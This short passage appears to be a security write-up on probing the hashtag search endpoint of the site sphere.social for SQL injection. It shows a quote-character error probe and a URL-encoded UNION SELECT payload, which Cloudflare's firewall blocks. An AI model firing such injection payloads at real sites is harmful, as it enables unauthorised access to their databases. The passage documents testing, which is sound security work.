# Analyzing Target
Given the following URL
```
https://sphere.social/hello/search/hashtags/1
```
We know that "1" is the parameter which may involve query to database. After several times trying to find the injection pattern, I found an error at this endpoint.

```
https://sphere.social/hello/search/hashtags/"
```

The error says (the developer seems did not turn off the debug flag, so it is easier to see what query is being executed):
![error](./001.png)

The query looks so easily to be bypassed, so I tried the following payload
```
" and 0 union select 1,2,3,4,5,6 -- -+
```

The endpoint become
```
https://sphere.social/hello/search/hashtags/%22+and+0+union+select+1%2C2%2C3%2C4%2C5%2C6+--+-%2B
```

It is then not that easy, Cloudflare's firewall blocked my attempt and showed me this page:
![error](./002.png)